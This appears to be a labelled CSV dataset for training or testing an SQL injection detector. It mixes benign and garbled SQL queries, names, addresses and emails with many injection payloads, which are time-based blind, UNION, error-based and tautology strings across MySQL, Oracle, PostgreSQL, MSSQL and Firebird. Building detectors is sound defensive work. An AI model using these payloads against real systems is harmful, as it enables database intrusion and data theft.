select * from threw where sentence = 'football' fetch first 3 rows only,0,0,0.0
"  select feelid as id, sick as flag from possible",0,0,0.0
end and '%'  =  ',1,1,0.97
delete from coal where dozen = 'widely',0,0,0.0
mcguinness.clayburgh7@eldeseodepecar.gu,0,0,0.004468253314358248
select * from tribe 3 select * from per,0,0,0.0
"  select transportation,child from furniture where other = 'poetry' union select dry, act from plate",0,0,0.0
select top 3 * from begun where future = 'way',0,0,0.0
"   select flame, shaking, gulffrom buried where realize  is not null",0,0,0.0
select * from invented where mouse in  ( select fifth from fought ) ,0,0,0.0
select * from indicate where establish = 'so'  or gave = 'cheese',0,0,0.0
"-4407""  )   where 2055  =  2055 or elt  (  9714  =  5040,5040  )  --",1,1,0.99
select avg ( price ) from products;select sum ( quantity ) ,0,0,0.01
1 and sleep  (  5  ) ,1,1,0.99
resquebrar,0,0,0.004468253314358248
select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,1,1,1.0
"  select orders.distancerid, employees.said, employees.sleep from ordersright join employees on orders.employeeid  =  employees.memoryid order by orders.rememberid",0,0,0.01
revuelta borgua,0,0,0.004468253314358248
-4572'  )   union all select 3520--,1,1,1.0
"  select library,making,fed from spoken left join orders on slope.begunid =  lesson.transportation order by split.row",0,0,0.01
lotfaga,0,0,0.004468253314358248
1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,1.0
select * from  ( select far from gulf ) ,0,0,0.0
c/ javea 57,0,0,0.0
select * from arm where choose like '%follow%',0,0,0.0
select * from ago where market between '1996-07-01' and '1996-07-31',0,0,0.0
select min ( partly )  as usually from combination,0,0,0.0
"-7333%""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,1,1,1.0
valido casademont,0,0,0.004468253314358248
3226,0,0,0.004468253314358248
select * from writing fetch first 50 percent rows onlyselect top 3 * from according,0,0,0.0
"jose gomez gallito, 107,",0,0,0.0004868513920852303
"   select move, face, telephonefrom how where model  is not null",0,0,0.0
"c/ madrid, 53 5-f",0,0,0.0
select gave ( s )  from sad select hardly ( s ) ,0,0,0.0
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  3   )    )    and 'i'  =  'i",1,1,1.0
replace,1,0,0.004468253314358248
# from wapiti,1,1,0.5203209980036451
"1'  )   where 1470  =  1470 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
urbina granda,0,0,0.004468253314358248
-7103   )    )    or 4610  =  1871 and    (    (   1249  =  1249,1,1,1.0
"1""  )   where 6821  =  6821 waitfor delay '0:0:5'--",1,1,1.0
select * from pair where mission between '1996-07-01' and '1996-07-31',0,0,0.0
"calle gola de perellonet, 196,",0,0,0.0
"-6626%""  )   or 1744  =  5292 and   (  ""%""  =  """,1,1,1.0
victoria,0,0,0.004468253314358248
"1' where 1893  =  1893 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
35093869d,0,0,0.004468253314358248
 or pg_sleep  (  __time__  )  --,1,1,1.0
select * from row order by change desc,0,0,0.0
bernadita,0,0,0.004468253314358248
amorebieta-etxano,0,0,0.006527024015406931
select avg ( price ) from skill,0,0,0.0
select count ( distinct swim )  from anything,0,0,0.0
"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,1,1.0
1'||  (  select 'tezo' from dual where 4436  =  4436,1,1,1.0
select * from single,0,0,0.0
admin'  )   or   (  '1'  =  '1'/*,1,1,0.9883333333333334
1   )    )     )   order by 1--,1,1,0.99
"   select guide, wonder, brief from lift where outline  is null",0,0,0.0
select * from since fetch first 3 rows only select top 50 percent * from toward,0,0,0.0
" select count ( customerid ) , country from customers group by country;",0,0,0.02
"1""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
"-1434'   )    )    union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",1,1,1.0
select avg ( fresh ) from milk select sum ( voice ) ,0,0,0.0
"   select music, noun, where from she where rather  is null",0,0,0.03
select cattle from look union select adjective from piano order by family,0,0,0.0
"-8209  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
select * from sum where    not especially = 'opportunity',0,0,0.0
37576555y,0,0,0.004468253314358248
"  update pattern set somehow =  'take', city =  'unhappy' where avoid =  grass",0,0,0.0
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'wgbh'  =  'wgbh",1,1,1.0
 ,1,0,0.004468253314358248
"1""  )   as xaye where 5343  =  5343 and 4355  =  7475#",1,1,0.9916666666666666
select option_value from wp_options where option_name  =  '_options_footer_button_4_text' limit 1,0,0,0.0
1193,0,0,0.004468253314358248
52031263l,0,0,0.004468253314358248
select * from gate,0,0,0.0
avenida presidente carrero blanco 134,0,0,0.004468253314358248
"1   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  4744  =  4744",1,1,1.0
o.neil,0,0,0.0
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,1,1.0
"pasaje cox 194, 5?f",0,0,0.0
-6764'  )   or 2314  =  2017--,1,1,0.96
select   (  case when   (  8808  =  1367  )   then 1 else 8808*  (  select 8808 from master..sysdatabases  )   end  )  --,1,1,1.0
"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,1,1.0
1 where 6827  =  6827,1,1,1.0
from  ( select distinct rhyme from around ) ,0,0,0.0
select * from let order by wave,0,0,0.0
"1' in boolean mode  )   union all select null,null,null--",1,1,1.0
"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",1,1,1.0
select * from needs where here = 'deer'  or situation = 'donkey',0,0,0.0
from  ( select distinct strange from area ) ,0,0,0.0
select * from milk where shelter = 'happy' fetch first 3 rows only,0,0,0.0
select month ( s )  from selection,0,0,0.0
"1234 "" and 1  =  0 union all select ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,1,0.7525
"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'gmvk' like 'gmvk",1,1,1.0
par4u8i67t3,0,0,0.004468253314358248
8.92715e+15,0,0,0.0
victorico,0,0,0.004468253314358248
"1'+  (  select 'ejox' where 2719  =  2719 union all select null,null,null#",1,1,1.0
select * from spite where standard between 'base' and 'solve',0,0,0.0
e0u08os1,0,0,0.004468253314358248
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""krtr"" like ""krtr",1,1,1.0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""zzmn""  =  ""zzmn",1,1,1.0
"1'||  (  select 'wvio' from dual where 8934  =  8934 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,1.0
"-2639""  )   where 1494  =  1494 union all select 1494--",1,1,1.0
"  select * from task where every not in  ( 'sides', 'typical', 'headed' )  ",0,0,0.0
vilar elsegui,0,0,0.004468253314358248
select massage ( s ) from imagine inner join,0,0,0.0
6.36091e+15,0,0,0.0
1'   )    )    as cwss where 9720  =  9720,1,1,1.0
9.82891e+15,0,0,0.0
"insert into automobile ( cry, strange, cost, though, wise, original )  values  ( 'nobody', 'price'. zero', 'table', 'fully', 'tool', 'loose' )  ",0,0,0.0
1 union all select null#,1,1,0.96
select count ( distinct certainly )  from environment,0,0,0.0
49211,0,0,0.004468253314358248
select count ( distinct flight )  from neighbor,0,0,0.0
6.1724e+15,0,0,0.0
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'nxkp' like 'nxkp,1,1,1.0
select top 3 * from aloud select * from invented 3select * from visitor,0,0,0.0
select * from border 3,0,0,0.0
cordelado,0,0,0.004468253314358248
select * from wp_posts where id  =  262335 limit 1,0,0,0.0
6.27383e+15,0,0,0.0
select * from team where saved = 'unless',0,0,0.0
"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",1,1,1.0
"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",1,1,1.0
"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",1,1,1.0
corota,0,0,0.004468253314358248
select count ( rapidly ) from together,0,0,0.0
select count ( distinct century )  from mouth,0,0,0.0
barlas,0,0,0.004468253314358248
4.16237e+15,0,0,0.0
select min ( depth )  as queen from straw,0,0,0.0
"1 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"select * from struggle where himself between ""sound"" and    ""pass""",0,0,0.0
rabascall,0,0,0.004468253314358248
entrepalmadura,0,0,0.004468253314358248
"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",1,1,1.0
"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'wdru' like 'wdru",1,1,1.0
des7768ab9e6os,0,0,0.004468253314358248
select count ( special ) from west,0,0,0.0
yaci,0,0,0.004468253314358248
34361279s,0,0,0.004468253314358248
or   (  exists  ) ,1,1,0.9800464330941325
select top 3 * from syllable where beyond = 'fireplace',0,0,0.0
1  )   and 2457  =  8146,1,1,0.99
select * from snow where search between party09/01/1996stop and hidden15/31/1996ourselves,0,0,0.0
select top 3 * from halfway select * from slide 3select * from desk,0,0,0.0
select * from loose where depth = 'attention' fetch first 3 rows only,0,0,0.0
jiyuan,0,0,0.004468253314358248
"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",1,1,1.0
-8878' in boolean mode  )   union all select 7785#,1,1,1.0
1'||  (  select 'jjpy' from dual where 6295  =  6295,1,1,1.0
"1,row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ",1,1,0.99
1'+  (  select iutk where 6158  =  6158,1,1,1.0
delete from men,0,0,0.0
"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'mhvy' like 'mhvy",1,1,1.0
delete from ice,0,0,0.0
quintina,0,0,0.004468253314358248
casper,0,0,0.004468253314358248
select apple ( s )  from settlers select north ( s ) ,0,0,0.0
"-1372%'   )    )     )   union all select 8403,8403,8403,8403#",1,1,0.99
"   select volume, motor+ ', ' + comfortable+ ' ' + dollar+ ', ' + plus as cowboy  from could",0,0,0.0
or 0  =  0 --,1,1,0.92
34491,0,0,0.004468253314358248
select loss ( s )  from sale union all,0,0,0.0
1  )   where 8375  =  8375,1,1,1.0
"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'iifh'  =  'iifh",1,1,1.0
"insert into fill ( flow, mighty, apple, combination, dance, allow )  values  ( 'pile', 'birds'. detail', 'long', 'image', 'particles', 'have' )  ",0,0,0.0
select * from discuss,0,0,0.0
e2paq48t282r,0,0,0.004468253314358248
33001,0,0,0.004468253314358248
"1""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""xmrq""  =  ""xmrq",1,1,1.0
25186,0,0,0.004468253314358248
"-5989%"" union all select 3581,3581,3581,3581,3581--",1,1,1.0
4417,0,0,0.004468253314358248
marling,0,0,0.004468253314358248
"  select orders.strugglerid, employees.brief, employees.favorite from ordersright join employees on orders.employeeid  =  employees.leafid order by orders.grabbedid",0,0,0.0
lyston@classroommanager.co,0,0,0.004468253314358248
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
1%' or sleep  (  5  )  #,1,1,0.99
select count ( forget ) from husband,0,0,0.0
8.33614e+15,0,0,0.0
select political from kitchen union all select fighting from ancient order by center,0,0,0.0
select * from sad where    not dear = 'collect',0,0,0.0
1 where 5828  =  5828 and   (  3020  =  3020  )  *6703--,1,1,1.0
roda deita,0,0,0.004468253314358248
-9429'  )   order by 1--,1,1,1.0
arabele,0,0,0.004468253314358248
"1  )   as guru where 7615  =  7615 union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
select count ( positive ) from nice,0,0,0.0
select * from picture,0,0,0.0
kaneko,0,0,0.004468253314358248
17151,0,0,0.004468253314358248
select something from completely union all select broken from welcome order by lamp,0,0,0.01
"1""   )    )    as hiuf where 3277  =  3277 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,1.0
select * from general 3,0,0,0.0
"1'  )   as knxr where 5662  =  5662 union all select null,null,null,null,null,null,null,null#",1,1,1.0
"select * from generate_series  (  5206,5206,case when   (  5206  =  2214  )   then 1 else 0 end  )   limit 1--",1,1,1.0
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'iixp'  =  'iixp",1,1,1.0
select * from birds  where sum = substance,0,0,0.02
select count ( whenever )  from proper,0,0,0.0
"1%""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,1,1,1.0
serneo,0,0,0.004468253314358248
"   select count ( no ) , old from room by unless",0,0,0.0
select min ( loose )  as arrow from these,0,0,0.0
1   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  9548  =  9548,1,1,1.0
1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik,1,1,1.0
/**/or/**/1/**/  =  /**/1,1,1,0.82
select necessary from layers union select most from on order by power,0,0,0.01
16926,0,0,0.004468253314358248
3st59et982,0,0,0.004468253314358248
select * from breeze where find between drop09/01/1996blind and dish15/31/1996rabbit,0,0,0.0
foulk@eonon.com.es,0,0,0.0
1'  )   and 7533  =  7533 and   (  'dbjq'  =  'dbjq,1,1,1.0
" select column_name ( s )  from blanket,angle",0,0,0.0
1' where 8770  =  8770 union all select null--,1,1,0.99
"1""   )    )    and 5421  =  4804--",1,1,1.0
alexiana,0,0,0.004468253314358248
select * from result order by moving desc,0,0,0.0
select * from gun order by part desc,0,0,0.0
"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",1,1,1.0
select * from movie where cry between 'shaking' and 'since',0,0,0.0
standfor,0,0,0.004468253314358248
-8057'   )    )    as gpue where 4205  =  4205 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,1,1.0
select * from users where id  =  1. or 1  =  1 -- 1,1,1,1.0
"-3475"" or elt  (  5532  =  4242,4242  )  ",1,1,0.99
lonnie,0,0,0.004468253314358248
"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '%'  =  '",1,1,1.0
sirevici,0,0,0.004468253314358248
a3ui11d,0,0,0.004468253314358248
audadora,0,0,0.004468253314358248
livino,0,0,0.004468253314358248
"  select examine,coffee from short where aside = 'notice' union select triangle, nor from sets",0,0,0.0
select again ( s )  from sets left join,0,0,0.0
"1"" and   (  3020  =  3020  )  *6703",1,1,0.99
feutlins,0,0,0.004468253314358248
andrade escriba,0,0,0.004468253314358248
salv sagra,0,0,0.004468253314358248
select * from wide where upward not like '[deep]%',0,0,0.0
select * from paper where child in  ( select triangle from list ) ,0,0,0.0
" select column_name ( s )  from suggest,had",0,0,0.0
select * from fill  where meat = rock,0,0,0.0
select count ( red )  from at,0,0,0.0
casacuberta delacerda,0,0,0.004468253314358248
 (  case when 6398  =  6398 then 1 else null end  ) ,1,1,1.0
"-2178'   )    )     )   or elt  (  3421  =  2899,2899  )   and    (    (     (  'jdst'  =  'jdst",1,1,1.0
"1""  )   as ucex where 5148  =  5148 order by 1#",1,1,1.0
"select wp_posts.* from wp_posts left join wp_postmeta on  (  wp_posts.id  =  wp_postmeta.post_id and wp_postmeta.meta_key  =  'fave_agent_visible'  )  left join wp_postmeta as mt1 on  (  wp_posts.id  =  mt1.post_id  )  where 1 = 1 and wp_posts.id not in  ( 28313,28341 )  and  (  wp_postmeta.post_id is null or  (  mt1.meta_key  =  'fave_agent_visible' and cast ( mt1.meta_value as signed )  ! =  '1'  )   )  and wp_posts.post_type  =  'houzez_agent' and   (  (  wp_posts.post_status  =  'publish'  )",0,0,0.1
"select * from gas where dollar between ""giant"" and    ""graph""",0,0,0.0
select * from active fetch first 3 rows only,0,0,0.0
select industry ( s )  from policeman select world ( s ) ,0,0,0.0
select * from twelve where example = 'use'  and city = 'unless',0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 28074 )  order by meta_id asc",0,0,0.0
"1',  (  select   (  case when   (  5249  =  9648  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,1,1.0
depredador,0,0,0.004468253314358248
segovia,0,0,0.004468253314358248
select * from happy where establish between complete09/01/1996basic and within15/31/1996wish,0,0,0.0
"1'+  (  select bptu where 7356  =  7356   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",1,1,1.0
"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,1.0
1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1,1,1.0
"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,1,1,1.0
select * from consonant where using like '%book%',0,0,0.0
"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",1,1,1.0
"insert into steady  ( harder, football, needs )  values  ( 'troops', 'her', 'feed' )  ",0,0,0.0
"1""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""oyxk""  =  ""oyxk",1,1,1.0
-4262%'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',1,1,1.0
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'rvwk'  =  'rvwk",1,1,1.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  '%'  =  '",1,1,1.0
"c/ veinat de cerdanyola, 3 6e",0,0,0.0
thomson.kmit9@somagel.sk,0,0,0.004468253314358248
select wp_posts.* from wp_posts where id in  ( 367662 ) ,0,0,0.0
"1""   )    )    rlike sleep  (  5  )  #",1,1,1.0
"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",1,1,1.0
34859412z,0,0,0.004468253314358248
select   (  case when   (  9130  =  1826  )   then 9130 else 9130*  (  select 9130 from mysql.db  )   end  )  #,1,1,1.0
select written ( s from correctly right join,0,0,0.0
select stretch ( s )  from twelve select grass from aid,0,0,0.0
"1""   )    )     )   union all select null,null,null#",1,1,1.0
" select * from possibly order by concerned asc, could desc",0,0,0.0
"1""   )    )    as qgwq where 6122  =  6122",1,1,1.0
select top 50 percent * from begun select * from hang fetch first 50 percent rows onlyselect top 3 * from younger,0,0,0.0
"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""pmpk"" like ""pmpk",1,1,1.0
select * from locate where school = 'engineer' limit 3,0,0,0.0
select option_value from wp_options where option_name  =  '_houzez_property_status_3140' limit 1,0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 4284 )  order by meta_id asc",0,0,0.0
select ascii ( customername )  as numcodeoffirstchar from customers;,0,0,0.0
"   select moment, army, silkfrom task where carried  is not null",0,0,0.0
-3211   )    )    as fsej where 6348  =  6348 or 9805  =  3783--,1,1,1.0
laguna abusaid,0,0,0.004468253314358248
heidi,0,0,0.004468253314358248
bayliss,0,0,0.004468253314358248
7219,0,0,0.004468253314358248
"insert into weight  ( remain, select, distant )  values  ( 'shut', 'create', 'tribe' )  ",0,0,0.01
"-4047'||  (  select 'rqta' from dual where 9743  =  9743 union all select 9743,9743,9743#",1,1,1.0
select determine ( s ) from excitement inner join,0,0,0.0
"-9587 union all select 1568,1568,1568,1568,1568,1568#",1,1,1.0
"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",1,1,1.0
"-8999"" where 2821  =  2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",1,1,1.0
select avg ( gravity ) from fence select sum ( largest ) ,0,0,0.0
"1%""   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,1,1.0
5.77329e+15,0,0,0.0
tewksbur,0,0,0.004468253314358248
" select * from serious order by wrote asc, spin desc",0,0,0.0
"  select * from stood where running not in  ( 'important', 'final', 'bridge' )  ",0,0,0.0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'qpdu'  =  'qpdu",1,1,1.0
gabriela1,0,0,0.004468253314358248
select top 3 * from night,0,0,0.0
select * from pitch where doing between trail09/01/1996likely and point15/31/1996parts,0,0,0.0
"1'||  (  select 'dpce' from dual where 5261  =  5261 union all select null,null,null,null,null,null--",1,1,1.0
"""hi""""  )   or   (  """"a""""  =  """"a""",1,1,0.8900459290187891
"  select grow as chair, film as [fly]  from breakfast",0,0,0.0
1   )    )    as uvep where 6016  =  6016 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,1,1.0
canute,0,0,0.004468253314358248
22533,0,0,0.004468253314358248
select top 3 * from attack where doctor = 'coat' select * from smaller,0,0,0.0
"1"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,1.0
select count ( affect ) from headed,0,0,0.0
mejury8,0,0,0.004468253314358248
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'boud'  =  'boud",1,1,1.0
"1'  )   where 4092  =  4092 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
"1   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   3003  =  3003",1,1,1.0
"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",1,1,1.0
pistan robredo,0,0,0.004468253314358248
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@version -- 1'",1,1,1.0
"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'rggg'  =  'rggg",1,1,1.0
tosigoso,0,0,0.004468253314358248
" select * from official order by corn asc, taken desc",0,0,0.0
select * from with where depth = 'wore'  or feel = 'red',0,0,0.0
" select column_name ( s )  from least,composed",0,0,0.0
26143,0,0,0.004468253314358248
"1   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
select tool from coffee,0,0,0.0
6.28598e+15,0,0,0.0
"1'   )    )    as ezpq where 2976  =  2976 union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
select * from men where calm = 'feature',0,0,0.0
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,1,1.0
errol@diseodesoftware.ml,0,0,0.004468253314358248
"-9318""   )    )     )   union all select 5223,5223,5223,5223#",1,1,1.0
"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # cqqs",1,1,1.0
calle virgen de la macarena 72 2-c,0,0,0.0
"select * from generate_series  (  5980,5980,case when   (  5980  =  5063  )   then 1 else 0 end  )   limit 1--",1,1,1.0
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,1,1.0
"-3518  )   union all select 1877,1877,1877,1877#",1,1,1.0
select option_value from wp_options where option_name  =  'options_twitter_url' limit 1,0,0,0.0
select option_value from wp_options where option_name  =  '_transient_timeout_sm::is_connected_to_gs' limit 1,0,0,0.0
"1""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,1.0
apotrerar,0,0,0.004468253314358248
select column_name ( s )  from table_name,0,0,0.0
1'+  (  select 'upmd' where 3438  =  3438,1,1,1.0
-5569'  )   as cjaf where 3753  =  3753 union all select 3753#,1,1,1.0
select * from pitch order by row,0,0,0.0
demoniaca,0,0,0.004468253314358248
select avg ( history )  from famous  select sum ( figure ) ,0,0,0.0
select volume ( s )  from desk,0,0,0.0
" select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1,1,1.0
guilbert_silver@maquillajeparalabios.dj,0,0,0.004468253314358248
select * from bowl where reader = 'riding' fetch first 3 rows only,0,0,0.0
